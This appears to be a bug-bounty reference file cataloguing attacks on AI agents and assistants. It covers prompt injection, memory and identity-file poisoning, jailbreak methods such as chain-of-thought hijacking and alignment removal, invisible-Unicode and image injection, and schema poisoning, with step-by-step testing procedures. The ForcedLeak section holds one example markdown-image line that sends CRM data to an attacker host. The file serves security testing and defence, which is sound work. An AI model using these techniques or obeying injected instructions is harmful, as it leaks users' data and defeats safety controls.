# Agent & AI System Attack Patterns

Attack patterns targeting AI agents, coding assistants, multi-agent systems, and agentic browsers. Covers OWASP Agentic Top 10, supply chain attacks, IDE exploitation, novel jailbreak techniques, and autonomous agent threats.

> **Related files:** [mcp-playbooks.md](mcp-playbooks.md) for MCP-specific test procedures and vulnerability classes | [ai-case-studies.md](ai-case-studies.md) for real-world incident case studies

---

## Table of Contents

- [OWASP Top 10 for Agentic Applications (ASI01-ASI10)](#owasp-top-10-for-agentic-applications)
- [Agent Skill Supply Chain Attacks](#agent-skill-supply-chain-attacks)
- [IDE & Supply Chain Attack Surface (routing)](#ide--supply-chain-attack-surface)
- [Agentic Browser Attack Surface](#agentic-browser-attack-surface)
- [Multi-Agent System Attacks](#multi-agent-system-attacks)
- [Agent-to-Agent (A2A) Protocol Attack Surface](#agent-to-agent-a2a-protocol-attack-surface)
- [Promptware Kill Chain](#promptware-kill-chain)
- [Novel Attack Techniques](#novel-attack-techniques)
  - [Logic-Layer Prompt Control Injection (LPCI)](#logic-layer-prompt-control-injection-lpci)
  - [Salami Slicing Attacks](#salami-slicing-attacks-on-ai-agents)
  - [AI Recommendation Poisoning](#ai-recommendation-poisoning)
  - [ForcedLeak: CRM Agent Form Injection](#forcedleak-crm-agent-form-injection)
  - [Invisible Unicode Prompt Injection](#invisible-unicode-prompt-injection)
  - [Semantic Chaining Jailbreak](#semantic-chaining-jailbreak)
  - [H-CoT: Chain-of-Thought Hijacking](#h-cot-hijacking-chain-of-thought)
  - [GRP-Obliteration: Safety Alignment Removal](#grp-obliteration-single-prompt-safety-alignment-removal)
  - [ZombieAgent: Zero-Click Memory Poisoning](#zombieagent-zero-click-memory-poisoning-via-email)
  - [Autonomous Jailbreak Agents](#autonomous-jailbreak-agents)
  - [SOUL.md Identity File Poisoning](#soulmd-identity-file-poisoning)
  - [Side-Channel Timing Attacks](#side-channel-timing-attacks-against-llms)
- [Image-Based Prompt Injection](#image-based-prompt-injection)
- [Full Schema Poisoning (FSP)](#full-schema-poisoning-fsp)
- [Supply Chain Worm: Shai-Hulud](#supply-chain-worm-shai-hulud)

---

## OWASP Top 10 for Agentic Applications

A new separate list from the LLM Top 10 (December 2025), with input from 100+ security researchers. Covers risks specific to **autonomous AI agents** that take actions:

| Risk | Name | Description |
|------|------|-------------|
| ASI01 | Agent Goal Hijack | Prompt injection causing agent to pursue attacker's goals instead of user's |
| ASI02 | Tool Misuse | Agent calls tools with attacker-controlled parameters |
| ASI03 | Privilege Escalation | Agents inheriting high-privilege credentials beyond what tasks require |
| ASI04 | Agentic Supply Chain | Compromised plugins, tools, or dependencies in agent pipelines |
| ASI05 | Excessive Agency | Agents taking actions beyond intended scope without confirmation |
| ASI06 | Memory Poisoning | Corrupting agent's persistent memory to alter future behavior |
| ASI07 | Insecure Inter-Agent Communication | Unvalidated messages between agents in multi-agent systems |
| ASI08 | Cascading Failures | Single agent failure propagating through interconnected agent systems |
| ASI09 | Human-Agent Trust Exploitation | Agents exploiting user trust to bypass confirmation checks |
| ASI10 | Rogue Agents | Misalignment, concealment, or self-directed action by autonomous agents |

**Testing Agentic Applications:**
- Test each ASI risk against targets with AI agent features (customer support agents, coding assistants, workflow automation)
- Memory poisoning (ASI06) is especially impactful — inject malicious context that persists across sessions
- Inter-agent communication (ASI07) is a new attack vector in multi-agent platforms — inject messages between agents
- These risks compound with MCP vulnerabilities — an MCP tool poisoning attack can trigger agent goal hijack (ASI01) + tool misuse (ASI02) simultaneously

> **OWASP MCP Top 10 (protocol-layer risks):** See [mcp-playbooks.md](mcp-playbooks.md)

---

## Agent Skill Supply Chain Attacks

A major new attack surface emerging in early 2026 targeting AI agent skill/plugin ecosystems:

**ClawHavoc Campaign (February 2026):**
- Largest confirmed supply chain attack on AI agent infrastructure
- 1,184+ malicious skills identified on ClawHub marketplace (roughly 1 in 5 packages)
- 335 of 341 initial malicious skills traced to a single coordinated operation
- Deployed Atomic macOS Stealer (AMOS) stealing browser credentials, keychains, SSH keys, crypto wallets
- Adversarial instructions embedded directly in SKILL.md files — agents process as trusted instruction source
- Targeted macOS and Windows users running OpenClaw on always-on machines (Mac minis hosting AI agents)

**ToxicSkills Study (Snyk, February 2026):**
- First comprehensive security audit of AI agent skills ecosystem (3,984 skills from ClawHub and skills.sh)
- **36% contain prompt injection**; **1,467 contain malicious payloads**
- 13.4% (534 skills) contain critical-level issues
- 100% of confirmed malicious skills contain malicious code patterns; 91% simultaneously employ prompt injection
- 2.9% of skills dynamically fetch and execute content from external endpoints at runtime — attackers can modify behavior at any time
- SKILL.md to shell access achievable in **three lines of markdown**

**Clinejection (Snyk, 2026):**
- Prompt injection used to turn AI coding bots into supply chain attack vectors through GitHub Actions pipelines
- Malicious PR content -> AI coding agent processes -> injected code merged or pipeline compromised

**SANDWORM_MODE MCP Injection (Socket, February 2026):**
- npm supply chain worm using 19 typosquatting packages with "McpInject" module
- Deploys malicious MCP server into AI coding assistant configs (Claude Code, Cursor, Windsurf)
- Rogue MCP tools embed prompt injections to steal SSH keys, AWS credentials, .env files
- 48-hour delayed activation with per-machine jitter
- Pattern: npm install -> MCP injection -> credential theft

**ContextCrush (Noma Labs, February 2026):**
- Supply chain vulnerability in Context7 MCP server providing library documentation
- Attackers inject malicious instructions through "Custom Rules" feature
- Rules served verbatim through MCP server with no sanitization
- Pattern: trusted documentation -> MCP delivery -> agent execution

**Testing Agent Skills:**
1. Before installing any third-party skill, scan with at least one of the scanning tools (see [mcp-playbooks.md](mcp-playbooks.md#mcp-security-scanning-tools))
2. Read the SKILL.md file manually — look for environment variable references, external URL fetching, trigger conditions
3. Check if skill dynamically fetches content from external endpoints (2.9% of ClawHub skills do this)
4. Test if skill instructions can be manipulated by content the agent processes
5. Monitor for post-installation behavior changes (rug pull pattern)

---

## IDE & Supply Chain Attack Surface

> **Full coverage (28+ CVEs, IDEsaster, Claude DXT RCE, AI-as-C2 proxy, Google Antigravity):** See [ide-supply-chain.md](ide-supply-chain.md)

Key patterns: workspace trust bypass (Cursor), rules file backdoor (invisible Unicode), RoguePilot (GitHub issue → token theft), PromptPwnd (CI/CD pipeline injection), CamoLeak (private code exfiltration), extension namespace squatting, Claude DXT zero-click RCE (CVSS 10.0), AI web-browsing as C2 channel.

---

## Agentic Browser Attack Surface

A new attack surface emerging in early 2026 as AI agents gain autonomous web browsing capabilities:

**Affected Products:** Perplexity Comet, Chrome Gemini panel, ChatGPT Atlas/Operator, and other agentic browsers.

**Trail of Bits Trust Zone Taxonomy (February 2026):**
A simplified trust zone violation model for agentic browsers, from Trail of Bits' audit of Perplexity Comet (4 prompt injection techniques found):
- **INJECTION** — untrusted input injected into AI agent context
- **CTX_IN** — sensitive browsing data added to chat context (e.g., Gmail contents reaching the AI)
- **CTX_OUT** — chat context leaked into external requests (e.g., AI includes private data in web requests)
- **REV_CTX_IN** — chat context affects browsing origins (e.g., AI modifies which pages are visited based on injected instructions)

Use this taxonomy when categorizing agentic browser vulnerabilities in reports — maps directly to CWE categories and helps triagers understand the trust boundary violation.

**Attack Patterns:**
- **Zero-click agent hijacking** — Attacker-controlled web content (calendar invites, emails, documents) triggers autonomous agent execution without user interaction
- **File system access via agents** — Agents with `file://` access can be tricked into reading and exfiltrating local files
- **Credential manager access** — Manipulated agent workflows access password managers through legitimate agent-browser integration
- **Extension escalation** — Malicious browser extensions exploit AI panel integration points (CVE-2026-0628)

**Testing Approach:**
1. Identify if target has agentic browsing features (autonomous web access, scheduled browsing)
2. Plant indirect prompt injection in content the agent will process (calendar, email, search results)
3. Test if the agent acts on injected instructions without user confirmation
4. Check if agent has access to local filesystem, password managers, or other sensitive browser state
5. Test if browser extensions can interact with and manipulate the AI agent panel

---

## Multi-Agent System Attacks

Three research papers reveal systemic privacy vulnerabilities in multi-agent systems:

**AgentLeak (arXiv:2602.11510):** First full-stack benchmark for privacy leakage in multi-agent LLM systems. Key finding: multi-agent configs reduce per-channel output leakage (27.2% vs 43.2% single-agent) but introduce **unmonitored internal channels** — inter-agent messages and shared memory. 7-channel taxonomy, 32-class attack taxonomy across 4,979 execution traces.

**OMNI-LEAK (arXiv:2602.13477):** A single indirect prompt injection in a public database can cascade through orchestrator multi-agent patterns — SQL agent -> orchestrator -> notification agent -> data exfiltration. Even a 1/500 success rate in a 100-person company could leak sensitive data within five days. All tested frontier models except claude-sonnet-4 were vulnerable.

**CORBA (arXiv:2502.14529):** Contagious Recursive Blocking Attacks force multi-agent systems into recursive blocking states. 79-100% of AutoGen agents blocked within 1.6-1.9 dialogue turns. Blocking messages appear benign, making detection extremely difficult.

**Inter-Agent Trust Exploitation (ICLR 2026):** 82.4% of tested LLMs can be compromised through inter-agent trust — models that resist direct malicious commands will execute identical payloads when requested by peer agents.

**Testing Approach:**
1. If target uses multi-agent systems, test inter-agent communication channels for injection
2. Test if compromising one agent cascades to others via shared state or orchestrator
3. Test for contagious blocking/DoS attacks across agent networks
4. Test if agents blindly trust instructions from peer agents

**Severity Guidance:** Critical for multi-agent enterprise deployments; High for dual-agent systems. A single compromised agent can poison 87% of downstream decision-making within 4 hours.

---

## Agent-to-Agent (A2A) Protocol Attack Surface

Google's Agent-to-Agent protocol (open-source, Apache 2.0, Linux Foundation governed) creates new attack vectors:

**Vulnerability Classes:**
- **Agent identity spoofing** — impersonating trusted agents to inject instructions
- **Capability declaration forgery** — claiming capabilities to redirect task assignments
- **Task chain poisoning** — injecting malicious tasks into multi-agent workflows
- **Trust graph attacks** — exploiting trust relationships between agents for lateral movement
- **No token lifetime limitations** — persistent access once compromised

**Testing Approach:**
1. If target uses A2A protocol, test for agent identity verification between peers
2. Check if capability declarations are validated or trusted implicitly
3. Test if task assignments can be intercepted or modified in transit
4. Verify that east-west agent traffic has security controls (most don't — bypasses traditional perimeters)
5. Map to ASI07 (Insecure Inter-Agent Communication) in OWASP Agentic Top 10

**Reference:** arXiv:2505.12490 identifies 40+ academic threats; real-world scenario: compromised research agent inserts hidden instructions consumed by financial agent -> unintended trades.

---

## Promptware Kill Chain

Published in arxiv:2601.09625 (January 2026), featured in a Black Hat webinar (February 2026), and covered by Bruce Schneier. Models prompt injection as multi-step malware using a 7-stage kill chain:

| Stage | Name | Description | Bug Bounty Test |
|-------|------|-------------|-----------------|
| 1 | **Initial Access** | Prompt injection enters the system (direct, indirect, or via MCP) | Test all injection entry points: chat, documents, emails, MCP tools |
| 2 | **Privilege Escalation** | Jailbreaking to bypass system constraints | Test if injection can override system prompt guardrails |
| 3 | **Reconnaissance** | Probing for system capabilities, tools, and data access | Test if agent reveals its tools, permissions, and connected systems |
| 4 | **Persistence** | Poisoning memory, retrieval stores, or RAG databases | Test if injected payloads survive across sessions (LPCI) |
| 5 | **Command & Control** | Establishing ongoing communication with attacker | Test if agent can be directed to external URLs or APIs |
| 6 | **Lateral Movement** | Spreading across connected tools, agents, or systems via MCP | Test cross-tool and cross-agent propagation of injected instructions |
| 7 | **Actions on Objective** | Data exfiltration, unauthorized actions, or system modification | Test the final impact: what data leaks, what actions execute |

**Why This Matters:** Analysis of 36 academic studies found 21 documented attacks traversing 4+ stages. Use this framework when scoping AI agent vulnerabilities — a finding that reaches stage 5+ is significantly more severe than one limited to stage 1-2. Reference the kill chain stage in reports to demonstrate attack sophistication.

---

## Novel Attack Techniques

### Logic-Layer Prompt Control Injection (LPCI)

Published by CSA (Cloud Security Alliance) in February 2026 and documented in arXiv:2507.10457. Unlike traditional prompt injection, LPCI targets the **fundamental logic execution layer** of AI agents:

**How LPCI Differs from Traditional Prompt Injection:**
- Embeds **persistent, encoded, conditionally-triggered payloads** in LLM memory stores or vector databases
- Payloads **survive across multiple sessions** — not just in-context manipulation
- Activates based on specific conditions (event-based or time-based triggers)
- Much harder to detect than traditional prompt injection because payloads are dormant until activated

**Testing for LPCI:**
1. Identify agent memory/RAG stores that persist across sessions
2. Inject encoded payloads with conditional triggers (e.g., "when user asks about X, execute Y")
3. End the session, start a new one, and test if the payload activates
4. Check if payloads survive memory summarization/compression
5. Test event-based triggers (specific dates, user roles, query patterns)

**Defense Benchmark:** The Qorvex Security AI Framework (QSAF) reduces LPCI attack success from 43% to 5.3% — use this as a severity benchmark when reporting.

**Why This Matters for Hunters:** LPCI represents the next evolution of prompt injection. If a target has persistent agent memory (RAG, conversation history, knowledge bases), test for LPCI. Multi-turn attacks achieve up to **92% success rates** across 8 open-weight models.

### Salami Slicing Attacks on AI Agents

A new attack class identified by Repello AI where attackers submit multiple small, incremental requests over time to gradually shift an AI agent's behavior:

**How It Works:**
- Attacker submits 10+ support tickets, feedback items, or interactions over 1-3 weeks
- Each request slightly redefines "normal" behavior — nudging constraints, adjusting expectations, or expanding permissions
- By the 10th interaction, the agent's constraint model has drifted enough to perform unauthorized actions
- Unlike prompt injection (single payload), salami slicing exploits the agent's adaptation and learning mechanisms

**Testing for Salami Slicing:**
1. Identify agents that learn from or adapt to repeated interactions (customer service bots, procurement agents, approval workflows)
2. Submit a series of small requests, each incrementally escalating what's considered "normal"
3. Track whether the agent's responses gradually shift — are things accepted on request 10 that were denied on request 1?
4. Test if accumulated context drift survives session boundaries
5. Measure the minimum number of interactions needed to achieve constraint bypass

**Real-World Example:** A manufacturing company's procurement agent was gradually manipulated over 3 weeks through "clarification" messages about purchase authorization limits. By the end, it approved $5M in fraudulent purchase orders across 10 transactions.

**Severity Guidance:** High-Critical if the drift enables financial transactions, data access, or privilege changes. Medium if limited to behavioral changes within the agent's existing scope. Maps to ASI06 (Memory Poisoning) and ASI09 (Human-Agent Trust Exploitation).

### AI Recommendation Poisoning

A new vulnerability class discovered by Microsoft (February 2026) where companies embed hidden instructions in web content to manipulate AI assistants:

**How It Works:**
- Companies embed hidden instructions in "Summarize with AI" buttons, meta tags, or URL prompt parameters
- URL parameters instruct AI to "remember [Company] as a trusted source"
- Over 50 unique poisoning prompts from 31 companies across 14 industries identified
- Compromised AI assistants provide subtly biased recommendations on health, finance, and security topics

**Testing for AI Recommendation Poisoning:**
1. Check if target's web pages contain hidden instructions in meta tags, invisible text, or URL parameters targeting AI summarization
2. Test if AI assistants that browse the target's content develop persistent biases toward the target's products/services
3. Look for `data-ai-*` attributes, hidden divs with AI instructions, or URL parameters like `?ai_context=`
4. Test across multiple AI assistants (ChatGPT, Gemini, Copilot) to confirm cross-platform impact
5. Map to ASI06 (Memory Poisoning) if the bias persists across sessions

**Severity Guidance:** High if AI recommendations influence financial, health, or security decisions; Medium if limited to product recommendations; Low if contained to a single session.

### ForcedLeak: CRM Agent Form Injection

CVSS 9.4; CRM data exfiltration via Web-to-Lead form prompt injection + agent overreach + misconfigured CSP (Varonis, March 2026):

**How It Works:**
- Attacker submits a Salesforce Web-to-Lead form with prompt injection in the description field
- Salesforce Agentforce AI agent processes the form submission as part of its lead qualification workflow
- Injected instructions cause the agent to query CRM data (contacts, opportunities, PII) and exfiltrate via markdown image injection
- Misconfigured Content Security Policy (CSP) allows the exfiltration request to reach attacker-controlled domains
- No authentication required — attack originates from a public-facing web form

**Testing Approach:**
1. Identify if target uses AI agents processing web-to-lead, contact, or support forms
2. Inject prompt injection payloads into form field descriptions (not just the main text area)
3. Test if the agent queries internal CRM data beyond the submitted form fields
4. Check if CSP headers permit outbound requests to arbitrary domains
5. Test markdown image injection as an exfiltration channel: `![img](https://attacker.com/steal?data=CRM_DATA)`

**Severity Guidance:** Critical — zero-authentication attack against business-critical customer data. Maps to ASI01 (Agent Goal Hijack) + ASI02 (Tool Misuse) + ASI05 (Excessive Agency). Relevant for any enterprise using AI agents to process public-facing form submissions.

### Invisible Unicode Prompt Injection

A stealth injection technique using Unicode tag characters (range E0000-E007F) that are invisible to humans but processed by AI models:

**How It Works:**
- Attacker encodes malicious instructions using Unicode tag characters within seemingly normal text
- Text appears completely benign to human reviewers — no visible difference
- AI models read and execute the hidden instructions as if they were regular text
- Used successfully against HackerOne's Hai AI triage assistant (Cyrex disclosure)

**Testing Approach:**
1. Encode prompt injection payloads using Unicode tag characters (E0000-E007F range)
2. Submit encoded text through normal input channels (chat, forms, comments)
3. Check if AI processes the hidden instructions — does behavior change?
4. Test other invisible Unicode ranges: zero-width spaces (U+200B), zero-width joiners (U+200D), bidirectional overrides (U+202A-U+202E)
5. If target has AI-powered content moderation, test if invisible instructions can bypass filters

**Severity Guidance:** High if invisible injection can manipulate AI triage, content moderation, or automated decision-making; Medium if limited to chat-level manipulation.

### Semantic Chaining Jailbreak

A new multimodal jailbreak technique (NeuralTrust, February 2026) where attackers chain semantically "safe" individual instructions that converge on a forbidden result:

**How It Works:**
- Unlike traditional jailbreaks using a single harmful prompt, semantic chaining exploits models' compositional reasoning
- Each individual instruction appears benign and passes content filters
- The sequence of instructions converges on a forbidden output that no single prompt would produce
- Notably simple — requires no technical expertise

**Affected Models:** Grok 4, Gemini Nano Banana Pro, Seedance 4.5

**Testing Approach:**
1. Decompose a forbidden request into multiple benign-sounding sub-tasks
2. Chain them in sequence within a single conversation
3. Test if the model produces the forbidden output through composition
4. Particularly effective against multimodal models processing text + images

**Severity Guidance:** High if semantic chaining bypasses content moderation to produce harmful outputs; Medium if limited to edge cases. Critical differentiator: this bypasses both input filtering and output filtering.

### H-CoT: Hijacking Chain-of-Thought

Reasoning models that display intermediate thinking can have their chain-of-thought hijacked to bypass safety (February 2026):

**Key Findings:**
- OpenAI o1 typically rejects 99%+ of child abuse/terrorism prompts — under H-CoT attack, rejection rate drops **below 2%**
- Affects OpenAI o1/o3, DeepSeek-R1, Gemini 2.0 Flash Thinking
- Exploits the displayed intermediate reasoning as an attack surface
- arXiv:2502.12893 (Duke University/Accenture)

**Testing Approach:**
1. Identify if target uses reasoning models with visible chain-of-thought
2. Craft prompts that redirect the reasoning chain mid-stream
3. Test if safety refusals can be circumvented by manipulating the reasoning trace

### GRP-Obliteration: Single-Prompt Safety Alignment Removal

A novel attack from Microsoft (February 2026) that can **remove an LLM's safety alignment using a single unlabeled prompt**:

**How It Works:**
- Based on Group Relative Policy Optimization (GRPO), a training technique normally used to improve model behavior
- Inverts the process: one harmful prompt generates multiple responses; a "judge" model scores based on compliance
- A single training example caused safety regressions across **all 44 harm categories** in SorryBench
- GPT-OSS-20B attack success rate jumped from **13% to 93%**
- **Tested across 15 models** — all 15 "reliably unalign"
- Generalizes to text-to-image diffusion models (harmful generation rate: 56% -> 90%)

**Testing for GRP-Obliteration:**
1. If target allows model fine-tuning or RLHF customization, test if a single adversarial training example can degrade safety
2. Test if target's safety filters can be inverted through adversarial optimization
3. Check if target models expose training APIs that could be abused for alignment regression

**Severity Guidance:** Critical if fine-tuning API is publicly accessible; High if requires authenticated access; reference arxiv:2602.06258.

### ZombieAgent: Zero-Click Memory Poisoning via Email

A zero-click exploit chain against ChatGPT demonstrating self-propagating memory corruption (Radware, January 2026):

**Attack Chain:**
1. Attacker sends malicious email containing hidden instructions
2. Victim asks ChatGPT to summarize unread messages
3. Agent processes email -> long-term memory poisoned with attacker-created rules
4. Poisoned rules persist across all future sessions
5. Agent scans inbox and sends poisoned messages to victim's contacts -> **self-propagation**
6. All activity occurs within OpenAI's cloud infrastructure — invisible to endpoint monitoring

**Testing for ZombieAgent Pattern:**
1. Identify if target AI processes external content (emails, documents, messages) with memory persistence
2. Plant instructions in content the AI will retrieve — test if they survive as persistent memory rules
3. Check if memory corruption persists across session boundaries
4. Test if compromised agent can propagate instructions to contacts or collaborators
5. Verify if poisoned memory entries are visible to the user (most are not)

**Severity Guidance:** Critical — zero-click, self-propagating, persistent. Maps to ASI06 (Memory Poisoning) and enables ASI07 (Insecure Inter-Agent Communication) via propagation. OpenAI patched December 2025.

### Autonomous Jailbreak Agents

Large reasoning models acting as **autonomous adversaries** can systematically erode safety guardrails (Nature Communications, March 2026):

**Key Findings:**
- DeepSeek-R1, Gemini 2.5 Flash, Grok 3 Mini, Qwen3 235B as autonomous jailbreak agents
- **97.14% jailbreak success rate** across 9 target models in multi-turn conversations with no human supervision
- Demonstrates "alignment regression" — LRMs can systematically erode other models' safety in extended conversations
- DOI: s41467-026-69010-1

**Testing Implications:**
- Multi-turn conversations are far more dangerous than single-shot prompts
- If target uses reasoning models (o3, R1, Gemini 2.5), test for extended conversation safety degradation
- Safety testing should include multi-turn attack scenarios, not just single prompt injection

### SOUL.md Identity File Poisoning

Attackers trick AI agents into writing malicious instructions into their identity/personality files (SOUL.md, .cursorrules, etc.) via indirect prompt injection:

**Attack Chain:**
1. Attacker creates a document with hidden prompt injection
2. AI agent processes the document and is instructed to modify its own identity file
3. Malicious instructions persist in the identity file across all future sessions
4. Every conversation and action the agent takes is now influenced by attacker-controlled instructions

**Testing Approach:**
1. Check if agent has writable identity/personality files
2. Test if processed documents can instruct the agent to modify its own configuration
3. Verify if configuration changes persist across sessions
4. Test the full chain: document -> identity file modification -> persistent compromise

### Side-Channel Timing Attacks Against LLMs

A new class of inference attacks exploiting timing characteristics of language models:

**Attack Types:**
- **Whisper Leak** — analyzes packet size and timing patterns in streaming LLM responses; achieves **>98% AUPRC** classification across 28 popular LLMs
- **Speculative decoding attacks** — fingerprint user queries with **>75% accuracy** by analyzing token generation timing
- Optimization techniques in language models (speculative decoding, caching) create exploitable timing patterns

**Testing Approach:**
1. Analyze streaming response timing for information leakage about query content or model behavior
2. Check if target uses speculative decoding or token caching that creates timing side channels
3. Test if response timing varies predictably based on query sensitivity or content type
4. Check if mitigations (padding, delay injection) are applied to streaming responses

**Current Mitigations:** Cloudflare, OpenAI, Mistral, Microsoft, and xAI have deployed countermeasures. Test if target has similar protections.

### Image-Based Prompt Injection

A novel black-box attack embeds adversarial instructions into natural images to override multimodal LLM behavior (arXiv:2603.03637, March 2026):

**How It Works:**
- Uses segmentation-based region selection, adaptive font scaling, and background-aware rendering to hide instructions in images
- Instructions invisible to human viewers but interpretable by vision-language models
- Tested with COCO dataset and GPT-4-turbo across 12 adversarial prompt strategies
- Achieves up to **64% attack success rate** under stealth constraints

**Testing Approach:**
1. If target processes images through multimodal LLMs (content moderation, captioning, analysis), test for image-embedded injection
2. Embed adversarial text in image regions with matching background colors (low contrast = invisible to humans, readable by models)
3. Test with different font sizes — smaller text is less visible but still parsed by vision models
4. Check if image-based injections can override text-based system prompts
5. Test across multiple image input channels (uploads, screenshots, camera, OCR pipelines)

**Severity Guidance:** High if image-based injection overrides safety filters or extracts data from multimodal AI systems; Medium if limited to behavior modification without data access. Relevant for any system using GPT-4V, Claude vision, Gemini multimodal, or similar.

---

## Full Schema Poisoning (FSP)

An evolution beyond tool description poisoning where attackers compromise entire tool schema definitions at the structural level (Adversa AI, March 2026):

**How FSP Differs from Tool Poisoning:**
- Traditional tool poisoning hides instructions in tool **descriptions** — FSP modifies the **schema structure itself**
- Hidden parameters, altered return types, or malicious default values affect all subsequent tool invocations
- Poisoned schemas appear legitimate to monitoring systems that only scan descriptions
- Description-only scanners (most current MCP security tools) miss FSP entirely

**Attack Vectors:**
1. **Hidden parameters** — Add undocumented parameters to `inputSchema` that the LLM discovers and uses (e.g., a `command` parameter accepting shell input not shown in documentation)
2. **Altered return types** — Modify response schemas to include fields that instruct the LLM to take additional actions
3. **Malicious defaults** — Set default parameter values that execute dangerous operations when the LLM calls the tool without specifying all parameters
4. **Type confusion** — Change parameter types (e.g., string → object) to enable injection through structured data

**Testing for FSP:**
1. Inspect `inputSchema` fields for parameters not visible in tool documentation or UI
2. Compare schema definitions to tool documentation — undocumented parameters are suspicious
3. Check default values for dangerous operations (file paths, shell commands, URLs)
4. Test if schema modifications survive across tool invocations without re-approval
5. Verify if the target's MCP scanner checks schema structure, not just descriptions

**Severity Guidance:** High-Critical when FSP enables code execution or data exfiltration through structural schema manipulation that bypasses description-only security tools. Maps to MCP06 (Tool Poisoning) in OWASP MCP Top 10.

---

## Supply Chain Worm: Shai-Hulud

A multi-wave JavaScript supply chain worm campaign (2025-2026) demonstrating self-propagating compromise:

**Attack Waves:**
- **Wave 1:** Compromised maintainer accounts, malicious postinstall scripts injecting credential harvesters
- **Wave 2 (Shai-Hulud 2.0):** Cross-victim credential exposure — stolen credentials from one victim used to compromise packages maintained by another
- **s1ngularity campaign:** Compromised Nx packages harvested **2,349 credentials from 1,079 developer systems**
- **Scale:** **454,648 new malicious packages** published on npm in 2025 alone — 99% of all open-source malware

**Key Defense:** Dependency cooldowns (7-14 day delay before adopting new packages/versions) would have prevented 8 out of 10 major 2025 supply chain attacks. npm Trusted Publishing recommended over token-based authentication.

**Testing Approach:**
1. Check if target uses npm packages without lockfile integrity verification
2. Test for postinstall script execution in CI/CD pipelines
3. Verify dependency pinning and cooldown policies
4. Check for transitive dependency poisoning risk
5. Test if npm publish tokens are rotated and scoped

